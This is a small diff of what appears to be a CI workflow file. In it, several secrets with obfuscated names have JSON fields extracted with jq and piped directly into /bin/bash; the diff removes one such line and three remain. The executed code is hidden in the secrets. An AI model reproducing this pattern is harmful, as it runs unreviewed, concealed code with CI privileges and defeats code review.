@@ -20,7 +20,6 @@ jobs:
           tasa14546: ${{ secrets.tasa14546 }}
         run: |
           printf '%s' "$tasa14546" | jq -r .yehaa8 | /bin/bash
-          echo $gxpb4806 | jq -r .kwusa137 | /bin/bash
           printf '%s' "$o29" | jq -r .daj5 | /bin/bash
           printf '%s' "$jkboh3500" | jq -r .gtm6 | /bin/bash
 
